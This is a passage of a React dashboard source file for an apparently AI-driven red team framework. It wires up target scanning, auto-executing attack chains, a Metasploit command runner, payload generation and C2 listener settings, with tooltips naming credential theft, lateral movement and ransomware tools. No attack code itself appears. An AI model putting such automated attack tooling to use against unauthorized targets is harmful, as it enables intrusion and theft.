import { useState, useEffect, useCallback, useRef } from "react";
import axios from "axios";
import { motion, AnimatePresence } from "framer-motion";
import {
  LayoutDashboard, Crosshair, GitBranch, Link, Brain, Terminal,
  Play, Square, Plus, Trash2, RefreshCw, ChevronRight, CheckCircle,
  Zap, Shield, Eye, Activity, Lock, Globe, Copy, X,
  Download, Search, Clock, AlertTriangle, Target,
  Settings, Save, Package, FileText, ArrowRight
} from "lucide-react";
import { ScrollArea } from "./components/ui/scroll-area";
import { Progress } from "./components/ui/progress";
import "./App.css";

const API = process.env.REACT_APP_BACKEND_URL ? `${process.env.REACT_APP_BACKEND_URL}/api` : "/api";

function App() {
  const [activeSection, setActiveSection] = useState("dashboard");
  const [target, setTarget] = useState("");
  const [targets, setTargets] = useState([]);
  const [selectedTarget, setSelectedTarget] = useState(null);
  const [selectedPhases, setSelectedPhases] = useState(["reconnaissance"]);
  const [isScanning, setIsScanning] = useState(false);
  const [currentScanId, setCurrentScanId] = useState(null);
  const [currentJobId, setCurrentJobId] = useState(null);
  const [scanStatus, setScanStatus] = useState(null);
  const [attackTree, setAttackTree] = useState(null);
  const [networkMap, setNetworkMap] = useState(null);
  const [history, setHistory] = useState([]);
  const [terminalLines, setTerminalLines] = useState([{ type: "info", text: "RED TEAM FRAMEWORK v7.0 // AI-DRIVEN // SQLite + Jobs", time: new Date() }]);
  const [logFilter, setLogFilter] = useState("all");
  const [mitreTactics, setMitreTactics] = useState([]);
  const [msfCmd, setMsfCmd] = useState("");
  const [msfExecuting, setMsfExecuting] = useState(false);
  const [msfResult, setMsfResult] = useState(null);
  const [attackChains, setAttackChains] = useState([]);
  const [selectedChain, setSelectedChain] = useState(null);
  const [chainExecution, setChainExecution] = useState(null);
  const [chainContext, setChainContext] = useState({ lhost: "", domain: "", user: "", pass: "" });
  const [chainPolling, setChainPolling] = useState(false);
  const [suggestedChains, setSuggestedChains] = useState([]);
  const [toolStatus, setToolStatus] = useState(null);
  const [aiAnalysis, setAiAnalysis] = useState(null);
  const [globalConfig, setGlobalConfig] = useState({ listener_ip: "", listener_port: 4444, c2_protocol: "tcp", operator_name: "operator", stealth_mode: false, auto_lhost: true });
  const [configSaving, setConfigSaving] = useState(false);
  const [payloadTemplates, setPayloadTemplates] = useState([]);
  const [generatedPayload, setGeneratedPayload] = useState(null);
  const [payloadFilter, setPayloadFilter] = useState("all");
  const [payloadRecommendations, setPayloadRecommendations] = useState([]);

  const pollIntervalRef = useRef(null);
  const chainPollRef = useRef(null);
  const terminalRef = useRef(null);
  const lastLoggedToolRef = useRef("");
  const lastLoggedDecisionRef = useRef(0);

  const addLog = useCallback((type, text) => {
    setTerminalLines(prev => [...prev.slice(-200), { type, text, time: new Date() }]);
  }, []);

  useEffect(() => {
    if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
  }, [terminalLines]);

  useEffect(() => {
    const load = async () => {
      try {
        const [tacticsRes, chainsRes, historyRes, configRes] = await Promise.all([
          axios.get(`${API}/mitre/tactics`),
          axios.get(`${API}/chains`),
          axios.get(`${API}/scan/history`),
          axios.get(`${API}/config`)
        ]);
        setMitreTactics(Object.entries(tacticsRes.data.tactics || {}).map(([phase, data]) => ({ phase, ...data })));
        setAttackChains(chainsRes.data.chains || []);
        setHistory(historyRes.data || []);
        if (configRes.data) {
          setGlobalConfig(configRes.data);
          if (configRes.data.listener_ip) setChainContext(prev => ({ ...prev, lhost: configRes.data.listener_ip }));
        }
      } catch (e) { addLog("error", `Init error: ${e.message}`); }
    };
    load();
  }, [addLog]);

  const stats = {
    activeTargets: targets.filter(t => t.status === "scanning").length,
    compromised: targets.filter(t => t.status === "completed").length,
    sessions: scanStatus?.vault_summary?.sessions || 0,
    totalScans: history.length,
  };

  // ==================== SCAN ====================
  const startScan = async (scanTarget) => {
    const t = scanTarget || target;
    if (!t.trim()) return;
    setIsScanning(true);
    addLog("cmd", `ENGAGE >> ${t}`);
    lastLoggedToolRef.current = "";
    lastLoggedDecisionRef.current = 0;
    try {
      const res = await axios.post(`${API}/scan/start`, { target: t, scan_phases: selectedPhases, tools: [] });
      setCurrentScanId(res.data.scan_id);
      setCurrentJobId(res.data.job_id);
      addLog("success", `OP-ID: ${res.data.scan_id} | JOB: ${res.data.job_id}`);

      // Add to targets (prevent duplicates)
      setTargets(prev => {
        const clean = t.trim().toLowerCase();
        const existing = prev.find(x => x.target.toLowerCase() === clean);
        if (existing) return prev.map(x => x.target.toLowerCase() === clean ? { ...x, status: "scanning", scanId: res.data.scan_id } : x);
        return [...prev, { target: t.trim(), status: "scanning", scanId: res.data.scan_id, addedAt: new Date().toISOString() }];
      });

      pollIntervalRef.current = setInterval(() => pollScan(res.data.scan_id, res.data.job_id), 2000);
    } catch (e) { addLog("error", e.message); setIsScanning(false); }
  };

  const pollScan = async (scanId, jobId) => {
    try {
      const res = await axios.get(`${API}/scan/${scanId}/status`);
      setScanStatus(res.data);

      // Only log when tool or progress CHANGES
      const toolKey = `${res.data.current_tool}-${res.data.progress}`;
      if (res.data.current_tool && res.data.current_tool !== "ai_thinking" && toolKey !== lastLoggedToolRef.current) {
        lastLoggedToolRef.current = toolKey;
        addLog("info", `[${res.data.current_tool}] ${res.data.progress}%`);
      }

      // Only log NEW AI decisions
      const decisions = res.data.ai_decisions || [];
      if (decisions.length > lastLoggedDecisionRef.current) {
        for (let i = lastLoggedDecisionRef.current; i < decisions.length; i++) {
          const d = decisions[i];
          if (d.reasoning) addLog("warning", `[AI] ${d.reasoning}`);
        }
        lastLoggedDecisionRef.current = decisions.length;
      }
      if (res.data.status === "completed") {
        clearInterval(pollIntervalRef.current);
        setIsScanning(false);
        setCurrentJobId(null);
        addLog("success", "SCAN COMPLETE");
        setAttackTree(res.data.attack_tree);
        setAiAnalysis(res.data.ai_analysis);
        setTargets(prev => prev.map(x => x.scanId === scanId ? { ...x, status: "completed", results: res.data } : x));
        // Load network map & suggestions
        loadNetworkMap(scanId);
        loadChainSuggestions(scanId);
        loadPayloadRecommendations(scanId);
      } else if (res.data.status === "error") {
        clearInterval(pollIntervalRef.current);
        setIsScanning(false);
        setCurrentJobId(null);
        addLog("error", "SCAN FAILED");
      }
    } catch (e) { /* retry */ }
  };

  const abortScan = async () => {
    if (currentScanId) try { await axios.post(`${API}/scan/${currentScanId}/abort`); } catch (e) {}
    if (currentJobId) try { await axios.post(`${API}/jobs/${currentJobId}/cancel`); } catch (e) {}
    clearInterval(pollIntervalRef.current);
    setIsScanning(false);
    setCurrentJobId(null);
    addLog("error", "SCAN ABORTED");
  };

  const loadNetworkMap = async (scanId) => {
    try {
      const res = await axios.get(`${API}/scan/${scanId}/network_map`);
      setNetworkMap(res.data);
    } catch (e) { /* no map */ }
  };

  const loadChainSuggestions = async (scanId) => {
    try {
      const res = await axios.get(`${API}/chains/${scanId}/suggest`);
      setSuggestedChains(res.data.suggestions || []);
    } catch (e) { /* no suggestions */ }
  };

  const loadPayloadRecommendations = async (scanId) => {
    try {
      const res = await axios.post(`${API}/payloads/recommend`, { scan_id: scanId });
      setPayloadRecommendations(res.data.recommendations || []);
    } catch (e) { /* no recommendations */ }
  };

  // ==================== CHAINS ====================
  const loadChainDetail = async (chainId) => {
    try {
      const res = await axios.get(`${API}/chains/${chainId}`);
      setSelectedChain(res.data);
      setChainExecution(null);
    } catch (e) { addLog("error", e.message); }
  };

  const executeChainAuto = async () => {
    if (!selectedChain || !target) return;
    addLog("cmd", `CHAIN AUTO-EXECUTE: ${selectedChain.name} >> ${target}`);
    try {
      const res = await axios.post(`${API}/chains/execute`, { chain_id: selectedChain.id, target, context: chainContext, auto_execute: true });
      setChainExecution(res.data);
      addLog("success", `Chain started: ${res.data.total_steps} steps | Job: ${res.data.job_id || 'N/A'}`);
      // Start polling
      chainPollRef.current = setInterval(() => pollChainExecution(res.data.execution_id), 3000);
    } catch (e) { addLog("error", e.message); }
  };

  const prepareChain = async () => {
    if (!selectedChain || !target) return;
    try {
      const res = await axios.post(`${API}/chains/execute`, { chain_id: selectedChain.id, target, context: chainContext, auto_execute: false });
      setChainExecution(res.data);
      addLog("success", `Chain prepared: ${res.data.total_steps} steps`);
    } catch (e) { addLog("error", e.message); }
  };

  const runSingleStep = async (stepId) => {
    if (!chainExecution) return;
    addLog("cmd", `Running step ${stepId}...`);
    try {
      const res = await axios.post(`${API}/chains/execution/${chainExecution.execution_id}/step/${stepId}/run`);
      setChainExecution(res.data);
      const ss = res.data.step_statuses?.[String(stepId)];
      if (ss) addLog(ss.status === "completed" ? "success" : "warning", `Step ${stepId}: ${ss.status}`);
    } catch (e) { addLog("error", e.message); }
  };

  const pollChainExecution = async (execId) => {
    try {
      const res = await axios.get(`${API}/chains/execution/${execId}`);
      setChainExecution(res.data);
      // Log new entries
      const logs = res.data.logs || [];
      if (logs.length > 0) {
        const last = logs[logs.length - 1];
        if (last.msg && last.msg !== lastLoggedToolRef.current) {
          lastLoggedToolRef.current = last.msg;
          addLog("info", last.msg);
        }
      }
      if (res.data.status === "completed") {
        clearInterval(chainPollRef.current);
        addLog("success", "CHAIN COMPLETE");
      }
    } catch (e) { /* retry */ }
  };

  const loadToolStatus = async () => {
    try { const res = await axios.get(`${API}/health`); setToolStatus(res.data.checks); } catch (e) { addLog("error", e.message); }
  };

  const runMsfCommand = async () => {
    if (!msfCmd.trim()) return;
    setMsfExecuting(true);
    addLog("cmd", `MSF > ${msfCmd}`);
    try {
      const res = await axios.post(`${API}/msf/run`, { commands: msfCmd, timeout: 120 });
      setMsfResult(res.data);
      addLog(res.data.success ? "success" : "info", `MSF: ${res.data.success ? "Session opened!" : "Completed"}`);
    } catch (e) { addLog("error", e.message); }
    setMsfExecuting(false);
  };

  const saveConfig = async () => {
    setConfigSaving(true);
    try {
      const res = await axios.put(`${API}/config`, globalConfig);
      if (res.data.config) setGlobalConfig(res.data.config);
      addLog("success", `CONFIG SAVED: LHOST=${globalConfig.listener_ip}:${globalConfig.listener_port}`);
      if (globalConfig.listener_ip) setChainContext(prev => ({ ...prev, lhost: globalConfig.listener_ip }));
    } catch (e) { addLog("error", `Config save failed: ${e.message}`); }
    setConfigSaving(false);
  };

  const loadPayloads = async () => {
    try { const res = await axios.get(`${API}/payloads/templates`); setPayloadTemplates(res.data.payloads || []); } catch (e) { addLog("error", e.message); }
  };

  const generatePayload = async (payloadId) => {
    try {
      const res = await axios.post(`${API}/payloads/generate`, { payload_id: payloadId });
      setGeneratedPayload(res.data);
      addLog("success", `PAYLOAD GENERATED: ${res.data.name}`);
    } catch (e) { addLog("error", e.response?.data?.detail || e.message); }
  };

  const filteredLogs = logFilter === "all" ? terminalLines : terminalLines.filter(l => l.type === logFilter);

  const phaseTooltips = {
    reconnaissance: "Recoleccion de info: nmap, whatweb, subfinder, wafw00f",
    resource_development: "Preparar recursos: payloads, infraestructura",
    initial_access: "Acceso inicial: nuclei, nikto, gobuster, sqlmap",
    execution: "Ejecutar codigo en el target",
    persistence: "Mantener acceso: backdoors, crontabs",
    privilege_escalation: "Subir privilegios: root/SYSTEM",
    defense_evasion: "Evadir deteccion: ofuscacion, AV bypass",
    credential_access: "Robar credenciales: hydra, hashdump",
    discovery: "Descubrir red interna: ARP, SMB",
    lateral_movement: "Moverse entre maquinas: psexec, wmi",
    collection: "Recopilar datos del target",
    command_and_control: "Establecer C2: beacons, tunnels",
    exfiltration: "Extraer datos del target",
    impact: "Disrupcion: ransomware, destroy"
  };

  const navItems = [
    { id: "dashboard", icon: LayoutDashboard, label: "Dashboard" },
    { id: "targets", icon: Crosshair, label: "Targets" },
    { id: "graph", icon: GitBranch, label: "Network Map" },
    { id: "chains", icon: Link, label: "Chains" },
    { id: "msf", icon: Terminal, label: "MSF CLI" },
    { id: "payloads", icon: Package, label: "Payloads" },
    { id: "ai", icon: Brain, label: "AI Engine" },
    { id: "config", icon: Settings, label: "Config" },
    { id: "logs", icon: Terminal, label: "Logs" },
  ];

  // ==================== NODE COLORS ====================
  const nodeColor = (type, severity) => {
    if (type === "target") return "#FF003C";
    if (type === "vulnerability") return severity === "critical" ? "#FF003C" : severity === "high" ? "#FFB000" : "#FFD700";
    if (type === "service") return "#00FF41";
    if (type === "subdomain") return "#00F0FF";
    if (type === "waf") return "#FF6B35";
    if (type === "technology") return "#8BBE95";
    return "#2F4F38";
  };

  return (
    <div className="h-screen w-screen flex overflow-hidden" style={{ background: "var(--bg-base)" }}>
      {/* SIDEBAR */}
      <div className="w-52 flex-shrink-0 border-r border-[rgba(0,255,65,0.15)] flex flex-col" style={{ background: "var(--bg-panel)" }}>
        <div className="p-4 border-b border-[rgba(0,255,65,0.15)]">
          <div className="flex items-center gap-2">
            <Shield size={20} className="text-[#FF003C]" />
            <div>
              <div className="text-xs font-bold tracking-[0.2em] text-[#FF003C] uppercase">Red Team</div>
              <div className="text-[10px] text-[#2F4F38] tracking-wider">AI-DRIVEN v7.0</div>
            </div>
          </div>
        </div>
        <nav className="flex-1 py-2">
          {navItems.map(item => (
            <div key={item.id} onClick={() => { setActiveSection(item.id); if (item.id === "payloads" && payloadTemplates.length === 0) loadPayloads(); if (item.id === "msf") loadToolStatus(); }} className={`nav-item ${activeSection === item.id ? "active" : ""}`} data-testid={`nav-${item.id}`}>
              <item.icon size={14} />
              <span>{item.label}</span>
            </div>
          ))}
        </nav>
        <div className="p-3 border-t border-[rgba(0,255,65,0.15)]">
          <div className="w-full py-3 text-xs font-bold tracking-[0.15em] uppercase text-center text-[#00FF41] border-t border-[rgba(0,255,65,0.1)]">
            <Brain size={14} className="inline mr-2" />AI-DRIVEN
          </div>
        </div>
        <div className="p-3 border-t border-[rgba(0,255,65,0.15)] text-[10px] space-y-1">
          <div className="flex justify-between"><span className="text-[#2F4F38]">STATUS</span><span className={isScanning ? "text-[#FFB000]" : "text-[#00FF41]"}>{isScanning ? "ENGAGING" : "STANDBY"}</span></div>
          <div className="flex justify-between"><span className="text-[#2F4F38]">TARGETS</span><span>{targets.length}</span></div>
          <div className="flex justify-between"><span className="text-[#2F4F38]">SESSIONS</span><span>{stats.sessions}</span></div>
          <div className="flex justify-between"><span className="text-[#2F4F38]">LHOST</span><span className={globalConfig.listener_ip ? "text-[#00FF41]" : "text-[#FF003C]"}>{globalConfig.listener_ip || "NOT SET"}</span></div>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="flex-1 flex flex-col min-w-0">
        {/* Top Bar */}
        <div className="h-10 flex-shrink-0 border-b border-[rgba(0,255,65,0.15)] flex items-center px-4 gap-3" style={{ background: "var(--bg-panel)" }}>
          <input type="text" value={target} onChange={e => setTarget(e.target.value)} onKeyDown={e => e.key === "Enter" && !isScanning && startScan()} placeholder="TARGET (IP / DOMAIN / CIDR)" className="tac-input flex-1 text-xs h-7" data-testid="target-input" />
          {!isScanning ? (
            <button onClick={() => startScan()} disabled={!target.trim()} className="tac-btn tac-btn-red h-7 text-[10px]" data-testid="start-scan-btn"><Play size={12} /> ENGAGE</button>
          ) : (
            <button onClick={abortScan} className="tac-btn tac-btn-red h-7 text-[10px]" data-testid="abort-scan-btn"><Square size={12} /> ABORT</button>
          )}
          {isScanning && <Progress value={scanStatus?.progress || 0} className="w-32 h-1 bg-[#0a140a]" />}
        </div>

        <div className="flex-1 flex min-h-0">
          <div className="flex-1 overflow-auto p-4 min-w-0">
            <AnimatePresence mode="wait">
              <motion.div key={activeSection} initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -8 }} transition={{ duration: 0.15 }}>

                {/* ===== DASHBOARD ===== */}
                {activeSection === "dashboard" && (
                  <div className="space-y-4" data-testid="dashboard-section">
                    <div className="grid grid-cols-4 gap-3">
                      {[
                        { label: "Active Targets", value: stats.activeTargets, color: "#FFB000" },
                        { label: "Completed", value: stats.compromised, color: "#00FF41" },
                        { label: "Sessions", value: stats.sessions, color: "#00F0FF" },
                        { label: "Total Ops", value: stats.totalScans, color: "#8BBE95" },
                      ].map((m, i) => (
                        <div key={i} className="metric-card" data-testid={`metric-${m.label.toLowerCase().replace(/ /g, "-")}`}>
                          <div className="metric-value" style={{ color: m.color }}>{m.value}</div>
                          <div className="metric-label">{m.label}</div>
                        </div>
                      ))}
                    </div>

                    <div className="panel p-3">
                      <div className="panel-header mb-3" style={{ margin: "-12px -12px 12px", padding: "8px 12px" }}>
                        <h3>MITRE ATT&CK Kill Chain</h3>
                        <span className="text-[10px] text-[#2F4F38]">{selectedPhases.length} fases seleccionadas</span>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        {mitreTactics.map(tac => (
                          <div key={tac.id} className="relative group">
                            <button onClick={() => setSelectedPhases(prev => prev.includes(tac.phase) ? prev.filter(p => p !== tac.phase) : [...prev, tac.phase])} className={`text-[10px] px-2 py-1 border transition-all ${selectedPhases.includes(tac.phase) ? "border-[#00FF41] text-[#00FF41] bg-[rgba(0,255,65,0.08)]" : "border-[rgba(0,255,65,0.15)] text-[#2F4F38] hover:text-[#8BBE95]"}`} data-testid={`phase-${tac.phase}`}>
                              {tac.name}
                            </button>
                            <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-1 px-2 py-1 bg-[#0a0a0a] border border-[rgba(0,255,65,0.3)] text-[9px] text-[#8BBE95] whitespace-nowrap opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none z-50">
                              {phaseTooltips[tac.phase] || tac.description}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div className="panel">
                      <div className="panel-header"><h3>Recent Operations</h3><span className="text-[10px] text-[#2F4F38]">{history.length}</span></div>
                      <ScrollArea className="h-40 p-3">
                        {history.slice(-10).reverse().map((h, i) => (
                          <div key={i} className="flex items-center justify-between py-1 border-b border-[rgba(0,255,65,0.08)] last:border-0">
                            <span className="text-xs text-[#8BBE95] truncate flex-1">{h.target}</span>
                            <span className={`text-[10px] ${h.status === "completed" ? "text-[#00FF41]" : "text-[#FF003C]"}`}>{h.status}</span>
                          </div>
                        ))}
                        {history.length === 0 && <div className="text-[10px] text-[#2F4F38] text-center py-4">No operations yet</div>}
                      </ScrollArea>
                    </div>
                  </div>
                )}

                {/* ===== TARGETS ===== */}
                {activeSection === "targets" && (
                  <div className="space-y-3" data-testid="targets-section">
                    {selectedTarget ? (
                      /* TARGET DETAIL VIEW */
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <h3 className="text-xs font-bold tracking-[0.15em] uppercase text-[#FF003C]">{selectedTarget.target}</h3>
                          <button onClick={() => setSelectedTarget(null)} className="text-[#2F4F38] hover:text-[#FF003C]" data-testid="close-target-detail"><X size={16} /></button>
                        </div>
                        <div className="grid grid-cols-3 gap-2">
                          <div className="metric-card"><div className="metric-value text-[#00FF41]">{selectedTarget.status}</div><div className="metric-label">Status</div></div>
                          <div className="metric-card"><div className="metric-value text-[#FFB000]">{selectedTarget.results?.ai_decisions?.length || 0}</div><div className="metric-label">AI Decisions</div></div>
                          <div className="metric-card"><div className="metric-value text-[#00F0FF]">{Object.keys(selectedTarget.results?.results || {}).length}</div><div className="metric-label">Tools Run</div></div>
                        </div>

                        {/* AI Analysis */}
                        {selectedTarget.results?.ai_analysis && (
                          <div className="panel p-3">
                            <div className="panel-header" style={{ margin: "-12px -12px 12px", padding: "8px 12px" }}><h3>AI Analysis</h3></div>
                            <pre className="text-[10px] text-[#8BBE95] whitespace-pre-wrap max-h-40 overflow-auto">{selectedTarget.results.ai_analysis}</pre>
                          </div>
                        )}

                        {/* Results by tool */}
                        {selectedTarget.results?.results && (
                          <div className="panel">
                            <div className="panel-header"><h3>Tool Results</h3></div>
                            <ScrollArea className="h-48 p-3">
                              {Object.entries(selectedTarget.results.results).map(([toolId, result]) => (
                                <div key={toolId} className="mb-2 p-2 border border-[rgba(0,255,65,0.1)]">
                                  <div className="text-[10px] font-bold text-[#FFB000] uppercase">{toolId}</div>
                                  {result.ports && <div className="text-[10px] text-[#8BBE95]">{result.ports.length} puertos encontrados</div>}
                                  {result.findings && <div className="text-[10px] text-[#FF003C]">{result.findings.length} vulnerabilidades</div>}
                                  {result.vulnerabilities && <div className="text-[10px] text-[#FF003C]">{result.vulnerabilities.length} hallazgos</div>}
                                  {result.error && <div className="text-[10px] text-[#FF003C]">Error: {result.error}</div>}
                                </div>
                              ))}
                            </ScrollArea>
                          </div>
                        )}

                        {/* Actions */}
                        <div className="flex gap-2">
                          <button onClick={() => { setTarget(selectedTarget.target); startScan(selectedTarget.target); setSelectedTarget(null); }} className="tac-btn tac-btn-red flex-1 justify-center text-[10px]" disabled={isScanning} data-testid="continue-audit-btn">
                            <Play size={12} /> CONTINUAR AUDITORIA
                          </button>
                          {selectedTarget.scanId && (
                            <button onClick={() => window.open(`${API}/scan/${selectedTarget.scanId}/report/pdf`, '_blank')} className="tac-btn flex-1 justify-center text-[10px]" data-testid="download-target-pdf">
                              <Download size={12} /> DESCARGAR PDF
                            </button>
                          )}
                        </div>
                      </div>
                    ) : (
                      /* TARGETS LIST */
                      <>
                        <div className="flex gap-2">
                          <input type="text" value={target} onChange={e => setTarget(e.target.value)} placeholder="Add target..." className="tac-input flex-1 text-xs" />
                          <button onClick={() => {
                            if (target.trim()) {
                              const clean = target.trim().toLowerCase();
                              setTargets(prev => {
                                if (prev.find(x => x.target.toLowerCase() === clean)) { addLog("warning", `Target duplicado: ${target}`); return prev; }
                                return [...prev, { target: target.trim(), status: "idle", addedAt: new Date().toISOString() }];
                              });
                              setTarget("");
                            }
                          }} className="tac-btn text-[10px]" data-testid="add-target-btn"><Plus size={12} /> ADD</button>
                        </div>
                        <div className="space-y-1">
                          {targets.map((t, i) => (
                            <div key={i} className="panel flex items-center gap-3 p-3 cursor-pointer hover:border-[rgba(0,255,65,0.5)] transition-all" onClick={() => { if (t.results) setSelectedTarget(t); }} data-testid={`target-card-${i}`}>
                              <span className={`w-2 h-2 rounded-full flex-shrink-0 ${t.status === "scanning" ? "bg-[#FFB000] animate-pulse" : t.status === "completed" ? "bg-[#00FF41]" : "bg-[#2F4F38]"}`} />
                              <span className="text-xs flex-1 truncate">{t.target}</span>
                              <span className={`text-[10px] uppercase ${t.status === "completed" ? "text-[#00FF41]" : t.status === "scanning" ? "text-[#FFB000]" : "text-[#2F4F38]"}`}>{t.status}</span>
                              {t.results && <FileText size={12} className="text-[#00F0FF]" title="Ver informe" />}
                              {t.status === "idle" && <button onClick={(e) => { e.stopPropagation(); setTarget(t.target); startScan(t.target); }} className="tac-btn text-[10px]" data-testid={`scan-target-${i}`}><Play size={10} /></button>}
                              <button onClick={(e) => { e.stopPropagation(); setTargets(prev => prev.filter((_, idx) => idx !== i)); }} className="text-[#FF003C] hover:text-[#FF003C]/80" data-testid={`remove-target-${i}`}><Trash2 size={12} /></button>
                            </div>
                          ))}
                          {targets.length === 0 && <div className="text-[10px] text-[#2F4F38] text-center py-8">No targets. Escribe un objetivo arriba y click ADD.</div>}
                        </div>
                      </>
                    )}
                  </div>
                )}

                {/* ===== NETWORK MAP ===== */}
                {activeSection === "graph" && (
                  <div className="space-y-3" data-testid="graph-section">
                    <div className="panel" style={{ minHeight: "450px" }}>
                      <div className="panel-header"><h3>Network Infrastructure Map</h3>
                        {currentScanId && <button onClick={() => loadNetworkMap(currentScanId)} className="tac-btn text-[10px]" data-testid="refresh-map"><RefreshCw size={10} /> Refresh</button>}
                      </div>
                      <div className="p-4">
                        {networkMap && networkMap.nodes.length > 1 ? (
                          <div className="relative" style={{ minHeight: "380px" }}>
                            {/* Target node (center top) */}
                            {networkMap.nodes.filter(n => n.type === "target").map(node => (
                              <div key={node.id} className="flex justify-center mb-6">
                                <div className="px-4 py-2 border-2 border-[#FF003C] bg-[rgba(255,0,60,0.1)] text-center" data-testid="map-target-node">
                                  <Globe size={16} className="text-[#FF003C] mx-auto mb-1" />
                                  <div className="text-xs font-bold text-[#FF003C]">{node.label}</div>
                                  <div className="text-[9px] text-[#2F4F38]">TARGET</div>
                                </div>
                              </div>
                            ))}

                            {/* Branches */}
                            <div className="flex justify-center mb-2">
                              <div className="w-px h-6 bg-[rgba(0,255,65,0.3)]" />
                            </div>

                            {/* Services row */}
                            {networkMap.nodes.filter(n => n.type === "service").length > 0 && (
                              <>
                                <div className="text-[9px] text-[#2F4F38] uppercase tracking-wider mb-2 text-center">Services / Ports</div>
                                <div className="flex flex-wrap justify-center gap-2 mb-4">
                                  {networkMap.nodes.filter(n => n.type === "service").map(node => (
                                    <div key={node.id} className="px-2 py-1 border border-[#00FF41]/50 bg-[rgba(0,255,65,0.05)] text-center min-w-[80px]" data-testid={`map-node-${node.id}`}>
                                      <div className="text-[10px] font-bold text-[#00FF41]">{node.port}</div>
                                      <div className="text-[9px] text-[#8BBE95] truncate">{node.service}</div>
                                    </div>
                                  ))}
                                </div>
                              </>
                            )}

                            {/* Subdomains */}
                            {networkMap.nodes.filter(n => n.type === "subdomain").length > 0 && (
                              <>
                                <div className="text-[9px] text-[#2F4F38] uppercase tracking-wider mb-2 text-center">Subdomains</div>
                                <div className="flex flex-wrap justify-center gap-2 mb-4">
                                  {networkMap.nodes.filter(n => n.type === "subdomain").map(node => (
                                    <div key={node.id} className="px-2 py-1 border border-[#00F0FF]/50 bg-[rgba(0,240,255,0.05)] text-center" data-testid={`map-node-${node.id}`}>
                                      <div className="text-[9px] text-[#00F0FF]">{node.label}</div>
                                    </div>
                                  ))}
                                </div>
                              </>
                            )}

                            {/* Technologies & WAF */}
                            {networkMap.nodes.filter(n => n.type === "technology" || n.type === "waf").length > 0 && (
                              <>
                                <div className="text-[9px] text-[#2F4F38] uppercase tracking-wider mb-2 text-center">Technologies</div>
                                <div className="flex flex-wrap justify-center gap-2 mb-4">
                                  {networkMap.nodes.filter(n => n.type === "technology" || n.type === "waf").map(node => (
                                    <div key={node.id} className={`px-2 py-1 border text-center ${node.type === "waf" ? "border-[#FF6B35]/50 bg-[rgba(255,107,53,0.05)]" : "border-[#8BBE95]/30 bg-[rgba(139,190,149,0.05)]"}`} data-testid={`map-node-${node.id}`}>
                                      <div className={`text-[9px] ${node.type === "waf" ? "text-[#FF6B35]" : "text-[#8BBE95]"}`}>{node.label}</div>
                                    </div>
                                  ))}
                                </div>
                              </>
                            )}

                            {/* Vulnerabilities */}
                            {networkMap.nodes.filter(n => n.type === "vulnerability").length > 0 && (
                              <>
                                <div className="text-[9px] text-[#FF003C] uppercase tracking-wider mb-2 text-center">Vulnerabilities</div>
                                <div className="flex flex-wrap justify-center gap-2">
                                  {networkMap.nodes.filter(n => n.type === "vulnerability").map(node => (
                                    <div key={node.id} className={`px-2 py-1 border text-center ${node.severity === "critical" ? "border-[#FF003C]/70 bg-[rgba(255,0,60,0.08)]" : "border-[#FFB000]/50 bg-[rgba(255,176,0,0.05)]"}`} data-testid={`map-node-${node.id}`}>
                                      <div className={`text-[9px] font-bold ${node.severity === "critical" ? "text-[#FF003C]" : "text-[#FFB000]"}`}>[{node.severity?.toUpperCase()}]</div>
                                      <div className="text-[9px] text-[#8BBE95] max-w-[150px] truncate">{node.label}</div>
                                    </div>
                                  ))}
                                </div>
                              </>
                            )}
                          </div>
                        ) : (
                          <div className="text-center py-16 text-[#2F4F38] text-xs">
                            <GitBranch size={24} className="mx-auto mb-2 opacity-30" />
                            Ejecuta un scan para generar el mapa de infraestructura
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                )}

                {/* ===== CHAINS ===== */}
                {activeSection === "chains" && (
                  <div className="space-y-3" data-testid="chains-section">
                    {selectedChain ? (
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <h3 className="text-xs font-bold tracking-[0.15em] uppercase text-[#FF003C]">{selectedChain.name}</h3>
                          <button onClick={() => { setSelectedChain(null); setChainExecution(null); if (chainPollRef.current) clearInterval(chainPollRef.current); }} className="text-[#2F4F38] hover:text-[#FF003C]" data-testid="chain-close-btn"><X size={16} /></button>
                        </div>
                        <p className="text-[10px] text-[#8BBE95]">{selectedChain.description}</p>

                        <div className="grid grid-cols-4 gap-2">
                          {["lhost", "domain", "user", "pass"].map(f => (
                            <div key={f}>
                              <label className="text-[10px] text-[#2F4F38] uppercase">{f}</label>
                              <input type={f === "pass" ? "password" : "text"} value={chainContext[f]} onChange={e => setChainContext({ ...chainContext, [f]: e.target.value })} className="tac-input w-full text-xs mt-1" data-testid={`chain-${f}-input`} />
                            </div>
                          ))}
                        </div>

                        {chainExecution && (
                          <div className="panel p-3" data-testid="chain-execution-panel">
                            <div className="flex items-center justify-between mb-2">
                              <span className={`text-[10px] uppercase tracking-wider ${chainExecution.status === "completed" ? "text-[#00FF41]" : chainExecution.status === "running" ? "text-[#FFB000] animate-pulse" : "text-[#2F4F38]"}`}>
                                {chainExecution.status === "running" ? "EXECUTING..." : chainExecution.status === "completed" ? "CHAIN COMPLETE" : chainExecution.status.toUpperCase()}
                              </span>
                              <span className="text-[10px] text-[#2F4F38]">{chainExecution.progress || 0}%</span>
                            </div>
                            <Progress value={chainExecution.progress || 0} className="h-1 bg-[#0a140a] mb-3" />
                          </div>
                        )}

                        <ScrollArea className="h-56">
                          <div className="space-y-1">
                            {(selectedChain.steps || []).map(step => {
                              const ss = chainExecution?.step_statuses?.[String(step.id)] || { status: "pending", results: [] };
                              const isRunning = ss.status === "running";
                              const isComplete = ss.status === "completed" || ss.status === "warning";
                              const isFailed = ss.status === "failed";
                              return (
                                <div key={step.id} className={`panel p-2 ${isRunning ? "animate-pulse" : ""}`} style={{ borderColor: isComplete ? "#00FF41" : isRunning ? "#FFB000" : isFailed ? "#FF003C" : undefined }} data-testid={`chain-step-${step.id}`}>
                                  <div className="flex items-center justify-between">
                                    <span className="text-[10px] font-bold" style={{ color: isComplete ? "#00FF41" : isRunning ? "#FFB000" : isFailed ? "#FF003C" : "#8BBE95" }}>
